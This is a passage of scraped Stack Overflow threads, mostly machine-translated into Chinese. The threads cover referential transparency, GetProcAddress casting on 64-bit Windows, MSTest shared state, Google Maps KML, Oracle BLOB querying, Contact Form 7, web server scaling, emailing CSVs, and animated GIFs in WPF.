meaning-providing universe. (I'm borrowing notation from the field
of denotational semantics.)

Let us adapt Quine's definition somewhat formally as follows: a context `E[·]`
is referentially transparent iff given any two expressions `E1` and `E2` (no holes
there) such that `[[E1]] = [[E2]]` (i.e. the expressions denote/refer-to the
same referent) then it is the case that `[[E[E1]]] = [[E[E2]]]` (i.e. filling-in
the hole with either `E1` or `E2` results in expressions that also denote the same
referent).

Leibniz's rule of substituting equals for equals is typically expressed as 'if
`E1 = E2` then `E[E1] = E[E2]`', which says that `E[·]` is a function. A function
(or for that matter a program computing the function) is a mapping from a
source to a target so that there is at most one target element for each source
element. Non-deterministic functions are misnomers, they are either relations,
functions delivering sets, etc. If in Leibniz's rule the equality `=` is
denotational then the double-brackets are simply taken for granted and
elided. So a referentially transparent context is a function. And Leibniz's rule is the main ingredient of equational reasoning, so equational reasoning is definitely related to referential transparency.

Although `[[·]]` is a function from expressions to denotations, it could be a
function from expressions to 'values' understood as a restricted subset of
expressions, and `[[·]]` can be understood as evaluation.

Now, if `E1` is an expression and `E2` is a value we have what I think is meant by most people when defining referential transparency in terms of expressions, values, and evaluation. But as illustrated by the 1st and 3rd answers in this page, this is an inacurate definition.

The problem with contexts such as `[·]++` is not the side effect, but that its value is not defined in C isomorphically to its meaning. Functions are
not values (well, pointers to functions are) whereas in functional programming languages they are. Landin,
Strachey, and the pioneers of denotational semantics were quite clever in
using functional worlds to provide meaning.

For imperative C-like languages we can (roughly) provide semantics to
expressions using the function `[[·]] : Expression -> (State -> State x Value)`.

`Value` is a subset of `Expression`. `State` contains pairs
(identifier,value). The semantic function takes an expression and delivers as
its meaning a function from the current state to the pair with the updated
state and a value. For example, `[[x]]` is the function from the current state
to the pair whose first component is the current state and whose second
component is the value of x. In contrast, `[[x++]]` is the function from the
current state to the pair whose first component is a state in which the value
of x is incremented, and whose second component is that very value. In this
sense, the context `[·]++` is referentially transparent iff it satisfies the
definition given above. 

I think functional programmers are entitled to use referential transparency in
the sense that they naturally recover `[[·]]` as a function from expressions to values.
Functions are first-class values and the state can also be a value, not a
denotation. The state monad is (in part) a clean mechanism for passing (or
threading) the state.

* * *

## 回答 #11

> 赞同：4
> 
>             
> 
> 时间：2021-03-23T17:25:29.930

When I read the accepted answer, I thought I was on a different page not on stackoverflow.

Referential transparency is a more formal way of defining a pure function. Hence, if a function consistently yields the same result on the same input, it’s said to be **referentially transparent**.

```
let counter=0
function count(){
  return counter++
} 
```

this is not referentially transparent because return value depends on the external variable "counter" and it keeps changing.

This is how we make it referential transparent:

```
function count(counter){
       return counter+1
   } 
```

Now this function is stable and always returns the same output when provided with the same input.

* * *

## 回答 #12

> 赞同：2
> 
>             
> 
> 时间：2012-07-26T22:33:36.533

Note that this concept of "meaning" is something that happens in the mind of the observer.  Thus, the same "reference" can mean different things to different people.  So, for example, we have an Edinburgh disambiguation page in Wikipedia.

A related issue which can show up in the context of programming might be polymorphism.

And perhaps we should have a name for the special case of polymorphism (or perhaps even casting) where for our purposes the differing polymorphic cases are semantically equivalent (as opposed to just being similar. For example, the number 1 -- which might be represented using an integer type, or a complex type or any of a variety of other types -- can be treated polymorphically).

* * *

## 回答 #13

> 赞同：0
> 
>             
> 
> 时间：2018-12-09T09:59:03.647

I found the definition of **referential transparency** in the book "**Structure and Implementation of Computer Programs**" (the Wizard Book) useful because it is complemented by an explanation of how **referential transparency** is violated by introducing the **assignment operation**. Check out the following slide deck I made about the subject: [https://www.slideshare.net/pjschwarz/introducing-assignment-invalidates-the-substitution-model-of-evaluation-and-violates-referential-transparency-as-explained-in-sicp-the-wizard-book](https://www.slideshare.net/pjschwarz/introducing-assignment-invalidates-the-substitution-model-of-evaluation-and-violates-referential-transparency-as-explained-in-sicp-the-wizard-book)

* * *

## 回答 #14

> 赞同：0
> 
>             
> 
> 时间：2019-07-13T09:17:07.510

Referential transparency can be simply stated as:

*   An expression always evaluating to the same result in any context [[1]](https://wiki.haskell.org/Referential_transparency),

*   A function, if given the same parameters twice, must produce the same result twice [[2]](http://learnyouahaskell.com/input-and-output).

For example, the programming language Haskell is a pure functional language; meaning that it is referentially transparent.

* * *

## 回答 #15

> 赞同：0
> 
>             
> 
> 时间：2020-12-07T10:10:17.927

Referential transparency is a term used in computer science. It originates from mathematical logic, but it has a widely used and therefore valid meaning in computer science.

It means: *a construct* (such as a function) *that can be replaced by its result without changing its meaning.*

In common use, it is similar, but not quite equivalent, to *pure expressions*. A pure expression is composed solely of other pure expressions. A referentially transparent expression can be internally impure, for example using mutable state in the process of its computation, but has no side effects outside of the expression as a whole.

All pure functions, by virtue of their construction, are referentially transparent, but not necessarily vice-versa.

Many language features support impure referential transparency, such as the `ST` monad in Haskell, and `constexpr`s and certain lambdas in C++.

Sometimes referential transparency is enforced, and other times the programmer must guarantee it on their own.

# c++ - 视觉工作室的stdcall覆盖？

> ID：210836
> 
>         
> 
> 赞同：4
> 
>         
> 
> 时间：2008-10-17T01:28:03.637
> 
>         
> 
> 标签：c++, c, windows, visual-studio, 64-bit

在 xp 32bit 中，此行编译没有问题，但在 vista 64bit 中，此行：

```
m_FuncAddr = ::GetProcAddress (somthing); 
```

给出以下错误

> 错误 C2440：“=”：无法从“FARPROC”转换为“int (__cdecl *)(void)”

GetProcAddress 定义为

```
WINBASEAPI FARPROC WINAPI GetProcAddress (somthing) 
```

和 m_FuncAddr 作为

```
int (WINAPI *m_FuncAddr)(); 
```

据我了解，两者都是stdcall。

为了避免我不得不提出的错误

```
m_FuncAddr = (int (__cdecl *)(void))::GetProcAddress(somthing); 
```

我的问题：

如果 m_FuncAddr 和 GetProcAddress 都有 stdcall 调用约定，为什么我必须用 cdecl 来“调用”它？

VS项目设置'默认调用约定（设置为cdecl）是否有可能覆盖上面的assignemet语句？

提前致谢！

[编辑]

为了澄清这个问题：

在等式的一侧（比如第 1 侧）我有

```
int __stdcall * m_FuncAddr 
```

在另一边（第 2 面）

```
INT_PTR far __stdcall GetProcAddress 
```

So how is it that i have to cast side 2 with cdecl if both are stdcalls ?
Or am I not getting something ?

* * *

## 回答 #1

> 赞同：3
> 
>             
> 
> 时间：2008-10-17T01:38:39.607

The return type should be INT_PTR (a 64-bit value in 64-bit builds).  You shouldn't cast around this error -- the compiler is trying to tell you that something is wrong.

From WinDef.h:

```
#ifdef _WIN64
typedef INT_PTR (FAR WINAPI *FARPROC)(); 
```

So the declaration of m_FuncAddr should be:

```
INT_PTR (WINAPI *m_FuncAddr)(); 
```

* * *

## 回答 #2

> 赞同：2
> 
>             
> 
> 时间：2008-10-17T01:36:12.250

It's a coincidence that it compiles correctly in 32bit; the correct syntax is:

```
typedef int (WINAPI *FFuncType)();
FFuncType m_FuncAddr;
m_FuncAddr = (FFuncType)::GetProcAddress (somthing); 
```

You need to explicitly cast the result of ::GetProcAddress to the proper function signature. In 32bit, FARPROC happens to work with the signature you have, but probably not in 64bit.

Edit: Yes, in fact, looking at windef.h, the return type is INT_PTR in 64bit, so that's why you got the compiler error. You will still need to cast to the function signature as above for any function which does not happen to match the placeholder for FARPROC, though, so you should be doing it as above in general.

# c# - 在 MSTest 中的测试方法之间共享状态

> ID：210837
> 
>         
> 
> 赞同：2
> 
>         
> 
> 时间：2008-10-17T01:28:37.507
> 
>         
> 
> 标签：c#, unit-testing, mstest

如何在 MSTest 中的 TestMethods 之间共享状态。这些测试将作为有序测试按顺序运行。

```
 private TestContext testContext;

    public TestContext TestContext
    {
        get { return this.testContext; }
        set { this.testContext = value;}
    }

    [TestMethod]
    public void Subscribe()
    {
        bool subscribed = true;
        TestContext.Properties.Add("subscribed", subscribed);
        Assert.IsTrue(subscribed == true, string.Format("Subscribed...{0}", this.GetHashCode()));
    }

    [TestMethod]
    public void GenerateEvent()
    {
        bool subscribed = (bool)TestContext.Properties["subscribed"];
        Assert.IsTrue(subscribed == true, string.Format("Subscribed...{0}", this.GetHashCode()));

    } 
```

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
>             
> 
> 时间：2008-10-17T02:25:53.990

维亚斯，我同意乍得的观点，你仍然做错了。  

也就是说，您可以考虑使用 TestContext 对象。

请参阅[http://blogs.msdn.com/vstsqualitytools/archive/2006/01/10/511030.aspx](http://blogs.msdn.com/vstsqualitytools/archive/2006/01/10/511030.aspx)

* * *

## 回答 #2

> 赞同：0
> 
>             
> 
> 时间：2008-12-31T16:54:51.263

您可以使用静态成员在测试方法之间共享数据。

例如：

```
private static List<string> SharedValues = new List<string>();

[TestMethod]
public void TestMethod1()
{
   SharedValues.Add("Awesome!");
}

[TestMethod]
public void TestMethod2()
{
   SharedValues.Add("Thanks for the answer!");
}

[TestMethod]
public void TestMethod3()
{
    Assert.IsTrue(SharedValues.Contains("Awesome!"));
    Assert.IsTrue(SharedValues.Contains("Thanks for the answer!"));
} 
```

复制此代码并创建一个新的有序测试，测试 TestMethod1、TestMethod2、TestMethod3。会过去的！

* * *

## 回答 #3

> 赞同：0
> 
>             
> 
> 时间：2008-10-19T04:21:34.440

正如乍得指出的那样，似乎我别无选择，只能使用单个测试 [一旦工具迫使我做正确的事情;)] 来测试整个流程。

似乎我可以使用 TestContext.BeginTimer & EndTimer 来计时方法中的每个调用。

这是我收到此答案的 MSDN 论坛的链接

* * *

## 回答 #4

> 赞同：0
> 
>             
> 
> 时间：2011-09-14T12:22:30.463

您可以通过将信息存储在类级静态字段或属性中而不是 TestContext 中来跨测试共享信息。这样一来，就只有一份了。此外，任何一项测试放入这些字段或属性中的任何内容都可用于任何后续测试。

话虽如此......有序和/或相互依赖的测试仍然是邪恶的。

# javascript - 通过 Javascript 访问 Google 地图叠加层中的 KML 地标？

> ID：210881
> 
>         
> 
> 赞同：3
> 
>         
> 
> 时间：2008-10-17T01:45:52.150
> 
>         
> 
> 标签：javascript, jquery, google-maps, kml

我使用 GGeoXml 对象在嵌入式 Google 地图上覆盖了 KML 文件。我希望能够从 Javascript 访问 KML 文件中的特定地标（例如，突出显示地图上选定的多边形以响应用户操作）。

理想情况下，我想做的是这样的（伪代码）：

```
 geoXml.getPlacemarkByName('Foo').focus(); 
```

不幸的是，[Google Maps API](http://code.google.com/apis/maps/documentation/reference.html#GGeoXml)似乎没有公开地标或 KML 覆盖的任何其他内部结构。有人对我如何实现这一点有任何想法吗？我对覆盖层是如何在内部实现的一无所知，但似乎可能有一个黑客可以让我这样做。

我也在使用 jQuery FWIW。

* * *

## 回答 #1

> 赞同：3
> 
>             
> 
> 时间：2008-10-20T20:38:49.540

你看过[GeoXML](http://www.dyasdesigns.com/geoxml/)吗？

* * *

## 回答 #2

> 赞同：2
> 
>             
> 
> 时间：2008-12-17T19:25:57.353

这个问题似乎没有一个简单的解决方案，因为 Google 没有在 API 中提供答案。我发现访问单个地标的唯一方法是在将它们添加到地图时“捕获”它们。为此，您必须在地图对象上设置一个“addoverlay”侦听器。像这样的东西：

```
GEvent.addListener(map, 'addoverlay', function(o) {
    kmlmarkers.push(o);
} 
```

但是，我想不出一种从标记对象中获取地标 ID 的方法。因此，我能够访问特定地标的唯一方法是遍历数组并根据坐标将标记与我的数据匹配。这不是一个真正优雅的解决方案，但它是我能够使其工作的唯一方法。

* * *

## 回答 #3

> 赞同：0
> 
>             
> 
> 时间：2009-01-07T23:14:29.283

您可以通过简单地查看对象来弄清楚这一点，如下所示：

```
GEvent.addListener(map, 'addoverlay', function(obj)
{ if (!obj) {
        alert("Cannot describe a null object");
        return;
    }
    var str = "";

        for ( var prop in obj) {
            str += prop + " = " + obj[prop] + ",\n";
        }
        alert(str);
    }); 
```

那应该有帮助...

* * *

## 回答 #4

> 赞同：0
> 
>             
> 
> 时间：2009-09-18T04:41:48.883

查看 Kml 更新。您将需要一个placeark ID。

# oracle - 从数据库中查询二进制数据的最佳实践是什么？

> ID：210882
> 
>         
> 
> 赞同：2
> 
>         
> 
> 时间：2008-10-17T01:46:46.237
> 
>         
> 
> 标签：oracle, binary-data

我被要求向一个主要填充二进制数据的数据库 (Oracle) 添加可查询性。所以我需要能够查询几千字节的 blob 内的二进制范围。我以前从未这样做过，所以我想知道在开始这样的项目时要考虑哪些好的做法和陷阱。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
>             
> 
> 时间：2008-10-18T01:32:41.663

添加一列MD5，即BLOB数据的MD5校验和。或者，您可以创建一个具有相同主键和 MD5 列的新表。

Your cache module outside the database can make use of that column not to have to retrieve the BLOB column twice in a cache-hit.

OR, you could drop the BLOB data in the database and store it in a file system with the MD5 value as a filename with an http server as a network file server.

* * *

## 回答 #2

> 赞同：2
> 
>             
> 
> 时间：2008-10-17T02:50:07.247

在不知道您的确切要求的情况下，我只能发表一些一般性评论。

oracle 中的 BLOBS 不是最快速的类型。确保您不会在设计中构建许多性能瓶颈，并尽快对您构建的功能进行性能测试，以确保其满足要求。

dbms_lob 是你的朋友。特别是您可能会发现 read 和 substr 函数（用于读取 blob 的一部分）非常有用。

远离外部 C 风格的程序——它们可能会很慢。PL/SQL 函数往往要快得多。我不知道Java程序。由于 Java 引擎更多地集成到 Oracle 中，因此它们可能非常好用。将 PL/SQL 与 Java 进行比较可能值得做一个初步的概念证明。

使用 Java，您将能够以字节 [] 流的形式读取数据，并使用 Java 的世界将其操作到您心中的内容。Java 的外部过程很容易实现——您甚至可以将 Java 源代码提供给 Oracle。

对于 PL/SQL，我们发现一种非常有用的技术是将 blob 转换为 raw，将其转换为 varchar，然后将其转换为十六进制，然后使用标准的 Oracle 字符串函数处理十六进制（字符串）。IE：

```
create or replace function retrieve_data_from_blob (
    b blob
    , tag_code
)
as
    lw long raw;
    data varchar(30000);
    result varchar(100);
    amount pls_integer := 30000;
begin
    -- covert blob to long raw.
    -- amount will hold total bytes read.
    dbms_lob.read(b, amount, 1, lw);
    data := util_raw.rawtohex(lw);
    -- retrieve_embedded retrieves data tagged with tag_code
    -- from internal binary structure by reading hex data
    return retrieve_embedded(data, tag_code);
end;
/ 
```

这适用于大小不超过 15Kb 的 blob。例如，retrieve_embedded 函数可以通过执行 a 读取第一个“字节”，通过将其用作偏移量`substr(data, 1, 8)`将其转换为十进制......等等。`to_number(hexdata, 'xxxxxxxx')`

* * *

## 回答 #3

> 赞同：1
> 
>             
> 
> 时间：2008-10-18T00:59:04.647

当涉及到存储和检索相对较小的 BLOB（< DB_BLOCK_SIZE * 2 左右）时，存储参数可以产生相当大的差异。通常，您希望尽量减少行迁移和行链接，以及尽量减少浪费的可用空间。

也许对性能的最大影响是启用或禁用“IN ROW”存储——这绝对值得一试。

# php - WP-联系表 7 -- PHP

> ID：210899
> 
>         
> 
> 赞同：4
> 
>         
> 
> 时间：2008-10-17T02:05:35.357
> 
>         
> 
> 标签：php, wordpress, contact-form-7

我不知道您需要多少信息，但 WP-ContactForm-7 是 WordPress 的联系表格。默认情况下，它对网站上的所有表单都有一个服务器响应消息。我有多种形式，并希望为每一种形式提供不同的服务器响应消息。

如何为使用此插件创建的每个不同表单创建不同的服务器响应消息？

以下是插件中的 PHP 代码片段，似乎与联系表单显示的消息有关：

```
function message($status) {
    switch ($status) {
        case 'mail_sent_ok':
            return __('Your message was sent successfully. Thanks.', 'wpcf7');
        case 'mail_sent_ng':
            return __('Failed to send your message. Please try later or contact administrator by other way.', 'wpcf7');
        case 'validation_error':
            return __('Validation errors occurred. Please confirm the fields and submit it again.', 'wpcf7');
        case 'accept_terms':
            return __('Please accept the terms to proceed.', 'wpcf7');
        case 'invalid_email':
            return __('Email address seems invalid.', 'wpcf7');
        case 'invalid_required':
            return __('Please fill the required field.', 'wpcf7');
        case 'captcha_not_match':
            return __('Your entered code is incorrect.', 'wpcf7');
    }
} 
```

如果这还不够信息，那么您可以从[这里](http://downloads.wordpress.org/plugin/contact-form-7.1.8.0.3.zip)下载文件并查看整个源代码。

* * *

## 回答 #1

> 赞同：7
> 
>             
> 
> 时间：2009-06-22T12:58:24.847

如果您确保已升级到此插件的最新版本，则可以创建多个表单，每个表单都有自己的响应消息。

要创建新表格，请转到工具 -> 联系表格 7，然后单击“添加新表格”（顶部为红色）。

填写您的新表单详细信息，然后转到“消息”并单击“显示”。您可以在此处填写针对此表单的回复。完成后，再次向上滚动并单击右侧的“保存”按钮。

然后，您可以使用以下内容在帖子中包含指向此其他表单的链接：

[联系表格 2“我的第二个表格”]

（实际使用的代码将显示在用于编辑表单的页面上。）

# http - 您如何像 Google 一样扩展 HTTP 服务器？

> ID：210901
> 
>         
> 
> 赞同：32
> 
>         
> 
> 时间：2008-10-17T02:07:27.287
> 
>         
> 
> 标签：http, webserver, scalability

我经常惊叹于我如何能够随时随地从世界任何地方访问 www.google.com，并如此快速地获得返回页面。

当然，他们压缩输出并保持最小的设计——这很有帮助。

但他们必须同时点击*数百万*次点击位于 DNS 列为“www.google.com”的网络上的框。

所有设置了 Apache 或其他 Web 服务器的人都知道，在您开始同时获得几千个连接之前，一切都很棒而且超级快，更不用说*数百万*了！

那么，他们是如何做到的呢？我猜他们有一整套服务器机器，但你永远不会知道。刚才我去 Verizon 时，网址是 www22.verizon.com。你永远不会看到“www22.google.com”，*永远不会*。

任何想法他们使用什么特定技术，或者我们非谷歌凡人可以使用什么技术来做同样的事情？

* * *

## 回答 #1

> 赞同：45
> 
>             
> 
> 时间：2008-10-17T02:15:31.217

google.com、update.microsoft.com 和其他处理惊人高聚合带宽的服务通过 DNS 发挥了很大作用。

BGP Anycast 路由用于从世界各地的多个点公布其 DNS 服务器的 IP 地址。每个 DNS 服务器都配置为将 google.com 解析为地理位置相近的数据中心内的 IP 地址。所以这是基于地理位置的第一级负载平衡。

接下来，尽管对 google.com 的 DNS 查询将只返回少量 IP 地址，但 DNS 服务器会在其响应中快速循环通过大量地址。每个请求 google.com 的客户端都将获得一个特定的答案，并允许将该答案缓存一段时间，但下一个客户端将获得不同的 IP 地址。所以这是第二层负载均衡。

第三，他们使用传统的服务器负载平衡器将会话映射到单个 IP 地址到多个后端服务器。所以这是第三层负载均衡。

* * *

## 回答 #2

> 赞同：15
> 
>             
> 
> 时间：2008-10-17T02:13:21.767

这篇文章可能会让你感兴趣：

[谷歌平台：谷歌网站背后的技术基础设施](http://en.wikipedia.org/wiki/Google_platform)

* * *

## 回答 #3

> 赞同：7
> 
>             
> 
> 时间：2008-10-17T02:45:18.460

昨晚在奥斯汀的谷歌开放日上，艾伦·尤斯塔斯展示了谷歌在俄勒冈州达尔斯市的数据中心的照片，并说它大约有 3 个足球场那么大。

它是较新的之一，但谷歌有多个数据中心。这不像每个查询都发送到同一台计算机。

即便如此，如果您猜测 Google 拥有多少台计算机，以及每秒对 Google 进行多少查询，那么每个单独的服务器必须处理大量的请求。

以下是有关如何促进这一点的一些阅读材料：

[http://research.google.com/archive/bigtable.html](http://research.google.com/archive/bigtable.html) 

[http://labs.google.com/papers/gfs.html](http://labs.google.com/papers/gfs.html)

一般来说，只有[http://research.google.com/](http://research.google.com/)，那里有很多很酷的信息。

* * *

## 回答 #4

> 赞同：4
> 
>             
> 
> 时间：2008-12-26T15:43:44.203

[Moishe](https://stackoverflow.com/users/23786/moishe)是对的：虽然简单地以 Google 的规模交付静态 Web 内容已经足够具有挑战性，但它很容易理解，而且很多其他人也这样做。

然而，它确实是动态内容的交付，谷歌是其开拓者，因为他们的论文开始了这一切：[搜索引擎的剖析](http://infolab.stanford.edu/~backrub/google.html)。有很多聪明的技术，其中一些已经在这里提到过，但仍然......在谷歌上做*任何*查询，查询词不属于一起 - 它们不会被缓存 - 你仍然会得到一个结果在几百毫秒内返回给您：这绝对令人难以置信。

更复杂的是，有一个新的[SearchWiki](http://googleblog.blogspot.com/2008/11/searchwiki-make-search-your-own.html)功能，它可以在每个搜索结果中添加动态内容，并且如果您已登录，结果的个性化会受到限制。

谷歌一直擅长（在某种程度上）开放使这一切发生的聪明才智。最后，这一切都归结为构建所有东西以实现水平扩展。这就是 Google 如何跟上 Internet 指数级增长的方式：只需将更多硬件添加到您的 BigTable、Map/Reduce 和 Google 文件系统场。通过使用大量商品硬件，以及围绕它的良好基础设施和管理，Google 可以将整个索引保存在内存中，并且从一台机器到另一台机器的查询比访问磁盘要快。

与此同时，雅虎！购买越来越大的单片机，​​直到 Sun 无法将它们变得足够大，他们不得不切换到 Hadoop！，为时已晚。

扩展 Google 的 HTTP 服务器是最简单的部分！

* * *

## 回答 #5

> 赞同：3
> 
>             
> 
> 时间：2008-10-17T02:12:24.140

[http://www.akamai.com](http://www.akamai.com)

或者，翻译成英文（也许在 Chris 的回答中详细说明），使用具有世界各地节点的内容交付网络 (CDN) - 请注意，这些不仅是数据中心，而且是实际的 Web 服务器（尽管我相信大多数人不会t在区别上做出巨大的骨头）。Akamai 只是一个例子；点击谷歌“内容交付网络”，你一定会找到其他人。

您还可以实施缓存策略，尽管这可能不会让您走得那么远。;)

* * *

## 回答 #6

> 赞同：1
> 
>             
> 
> 时间：2008-10-17T02:14:42.203

除了大型网络农场之外，毫无疑问，他们正在做大量的缓存。他们可以缓存从页面内容到常用搜索词的任何内容。缓存是非谷歌凡人也可以做的事情。

* * *

## 回答 #7

> 赞同：0
> 
>             
> 
> 时间：2008-10-17T02:09:01.403

这是正常的互联网流量处理。从字面上看，谷歌在全球拥有响应 www.google.com 的整个数据中心

* * *

## 回答 #8

> 赞同：0
> 
>             
> 
> 时间：2008-10-17T03:02:45.023

他们也有自定义的 Web 服务器、TCP/IP 堆栈 [连同基础设施]，我几年前在某处读过......我怀疑 Apache 或 IIS 或任何其他商业/流行的 Web 服务器是否可以匹配......

# php - 如何通过电子邮件将 CSV 文件发送到特定的电子邮件？

> ID：210905
> 
>         
> 
> 赞同：0
> 
>         
> 
> 时间：2008-10-17T02:10:16.470
> 
>         
> 
> 标签：php, mysql

我有一张表（volunteers_2009），其中存储了所有志愿者，然后我有一张表（场所），列出了志愿者可以工作的所有不同场所（志愿者被分配到每个场所，并且存储在志愿者_2009.venue_id 中, 等于场地.id)

场地表还有一个电子邮件栏，每封电子邮件都是给每个场地的主席的。

我想要做的是能够自动向每位主席发送一封电子邮件，其中包含志愿者表的 CSV 文件（volunteers_2009），并且在此过程中，我希望它匹配志愿者_2009.venue_id 与场所.id 并发送 CSV只有分配到该主席场地的志愿者，因此主席只收到分配到其场地的志愿者的 CSV。

我将通过场地表运行，从头开始，将场地.id 与志愿者_2009.venue_id 匹配，然后运行 ​​CSV 导出功能以提取所有数据 WHERE 场地_id = #，然后将其附加到电子邮件中，收件人将是场地.chair_email。

我已经有一个导出 CSV 功能，我可以将场地 ID 传递给它以拉取适当的志愿者，我也有一个有效的电子邮件功能，所以我可以将附件和收件人传递给它。

这是完成此任务的函数函数理论的草图：
![替代文字](https://i.stack.imgur.com/Kn8fm.jpg)

如果您看到了更好的解决方法（如果您可以按照我糟糕的手写方式进行操作），请告诉我，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
>             
> 
> 时间：2008-10-17T03:41:37.033

假设您添加了错误处理，您似乎已经做对了。您可能希望将场所 ID 附加到 CSV 文件名上，以便您可以保存每个文件的副本（用于审核、退回或电子邮件系统关闭等）。

* * *

## 回答 #2

> 赞同：1
> 
>             
> 
> 时间：2009-01-16T13:33:32.403

我认为您最缺少的东西（如果我没看错的话）是电子邮件部分。查看[Swift Mailer](http://www.swiftmailer.org/wikidocs/v3/tutorials/attachments)以了解如何执行此操作的示例。

我在每个新的 PHP 项目上安装它以完全支持这一点。

# .net - 如何获得动画 gif 以在 WPF 中工作？

> ID：210922
> 
>         
> 
> 赞同：237
> 
>         
> 
> 时间：2008-10-17T02:19:42.723
> 
>         
> 
> 标签：.net, wpf, animated-gif

我应该使用什么控制类型 - `Image`,`MediaElement`等？

* * *

## 回答 #1

> 赞同：235
> 
>             
> 
> 时间：2012-06-14T13:22:35.590

我无法让这个问题（达里奥以上）的最流行的答案正常工作。结果是奇怪的、断断续续的动画和奇怪的伪影。迄今为止我发现的最佳解决方案：
 [https ://github.com/XamlAnimatedGif/WpfAnimatedGif](https://github.com/XamlAnimatedGif/WpfAnimatedGif)

您可以使用 NuGet 安装它

`PM> Install-Package WpfAnimatedGif`

并在要添加 gif 图像的窗口的新命名空间中使用它并使用它，如下所示

```
<Window x:Class="MainWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:gif="http://wpfanimatedgif.codeplex.com" <!-- THIS NAMESPACE -->
    Title="MainWindow" Height="350" Width="525">

<Grid>
    <!-- EXAMPLE USAGE BELOW -->
    <Image gif:ImageBehavior.AnimatedSource="Images/animated.gif" /> 
```

这个包真的很整洁，你可以设置一些属性，如下所示

```
<Image gif:ImageBehavior.RepeatBehavior="3x"
       gif:ImageBehavior.AnimatedSource="Images/animated.gif" /> 
```

你也可以在你的代码中使用它：

```
var image = new BitmapImage();
image.BeginInit();
image.UriSource = new Uri(fileName);
image.EndInit();
ImageBehavior.SetAnimatedSource(img, image); 
```

**编辑：Silverlight 支持**

根据 josh2112 的评论，如果您想为 Silverlight 项目添加动画 GIF 支持，请使用[github.com/XamlAnimatedGif/XamlAnimatedGif](http://github.com/XamlAnimatedGif/XamlAnimatedGif) 

* * *

## 回答 #2

> 赞同：110
> 
>             
> 
> 时间：2009-07-15T21:58:12.293

我发布了一个扩展图像控制并使用 Gif 解码器的解决方案。gif 解码器有一个 frames 属性。我为属性设置动画`FrameIndex`。该事件`ChangingFrameIndex`将源属性更改为对应的帧`FrameIndex`（即在解码器中）。我猜这个 gif 每秒有 10 帧。

```
class GifImage : Image
{
    private bool _isInitialized;
    private GifBitmapDecoder _gifDecoder;
    private Int32Animation _animation;

    public int FrameIndex
    {
        get { return (int)GetValue(FrameIndexProperty); }
        set { SetValue(FrameIndexProperty, value); }
    }

    private void Initialize()
    {
        _gifDecoder = new GifBitmapDecoder(new Uri("pack://application:,,," + this.GifSource), BitmapCreateOptions.PreservePixelFormat, BitmapCacheOption.Default);
        _animation = new Int32Animation(0, _gifDecoder.Frames.Count - 1, new Duration(new TimeSpan(0, 0, 0, _gifDecoder.Frames.Count / 10, (int)((_gifDecoder.Frames.Count / 10.0 - _gifDecoder.Frames.Count / 10) * 1000))));
        _animation.RepeatBehavior = RepeatBehavior.Forever;
        this.Source = _gifDecoder.Frames[0];

        _isInitialized = true;
    }

    static GifImage()
    {
        VisibilityProperty.OverrideMetadata(typeof (GifImage),
            new FrameworkPropertyMetadata(VisibilityPropertyChanged));
    }

    private static void VisibilityPropertyChanged(DependencyObject sender, DependencyPropertyChangedEventArgs e)
    {
        if ((Visibility)e.NewValue == Visibility.Visible)
        {
            ((GifImage)sender).StartAnimation();
        }
        else
        {
            ((GifImage)sender).StopAnimation();
        }
    }

    public static readonly DependencyProperty FrameIndexProperty =
        DependencyProperty.Register("FrameIndex", typeof(int), typeof(GifImage), new UIPropertyMetadata(0, new PropertyChangedCallback(ChangingFrameIndex)));

    static void ChangingFrameIndex(DependencyObject obj, DependencyPropertyChangedEventArgs ev)
    {
        var gifImage = obj as GifImage;
        gifImage.Source = gifImage._gifDecoder.Frames[(int)ev.NewValue];
    }

    /// <summary>
    /// Defines whether the animation starts on it's own
    /// </summary>
    public bool AutoStart
    {
        get { return (bool)GetValue(AutoStartProperty); }
        set { SetValue(AutoStartProperty, value); }
    }

    public static readonly DependencyProperty AutoStartProperty =
        DependencyProperty.Register("AutoStart", typeof(bool), typeof(GifImage), new UIPropertyMetadata(false, AutoStartPropertyChanged));

    private static void AutoStartPropertyChanged(DependencyObject sender, DependencyPropertyChangedEventArgs e)
    {
        if ((bool)e.NewValue)
            (sender as GifImage).StartAnimation();
    }

    public string GifSource
    {
        get { return (string)GetValue(GifSourceProperty); }
        set { SetValue(GifSourceProperty, value); }
    }

    public static readonly DependencyProperty GifSourceProperty =
        DependencyProperty.Register("GifSource", typeof(string), typeof(GifImage), new UIPropertyMetadata(string.Empty, GifSourcePropertyChanged));

    private static void GifSourcePropertyChanged(DependencyObject sender, DependencyPropertyChangedEventArgs e)
    {
        (sender as GifImage).Initialize();
    }

    /// <summary>
    /// Starts the animation
    /// </summary>
    public void StartAnimation()
    {
        if (!_isInitialized)
            this.Initialize();

        BeginAnimation(FrameIndexProperty, _animation);
    }

    /// <summary>
    /// Stops the animation
    /// </summary>
    public void StopAnimation()
    {
        BeginAnimation(FrameIndexProperty, null);
    }
} 
```

使用示例 (XAML)：

```
<controls:GifImage x:Name="gifImage" Stretch="None" GifSource="/SomeImage.gif" AutoStart="True" /> 
```

* * *

## 回答 #3

> 赞同：41
> 
>             
> 
> 时间：2010-09-02T08:34:29.047

这个小应用程序怎么样：背后的代码：

```
public MainWindow()
{
  InitializeComponent();
  Files = Directory.GetFiles(@"I:\images");
  this.DataContext= this;
}
public string[] Files
{get;set;} 
```

XAML：

```
<Window x:Class="PicViewer.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="MainWindow" Height="350" Width="525">
    <Grid>
        <Grid.ColumnDefinitions>
            <ColumnDefinition Width="175" />
            <ColumnDefinition Width="*" />
        </Grid.ColumnDefinitions>
        <ListBox x:Name="lst" ItemsSource="{Binding Path=Files}"/>
        <MediaElement Grid.Column="1" LoadedBehavior="Play" Source="{Binding ElementName=lst, Path=SelectedItem}" Stretch="None"/>
    </Grid>
</Window> 
```

* * *

## 回答 #4

> 赞同：38
> 
>             
> 
> 时间：2008-10-17T20:44:26.300

我也进行了搜索，并在旧 MSDN 论坛上的一个线程中找到了几种不同的解决方案。（链接不再有效，所以我删除了它）

最简单的执行似乎是使用 WinForms`PictureBox`控件，并像这样（从线程更改了一些东西，大部分相同）。

首先添加对`System.Windows.Forms`、`WindowsFormsIntegration`和`System.Drawing`项目的引用。

```
<Window x:Class="GifExample.Window1"
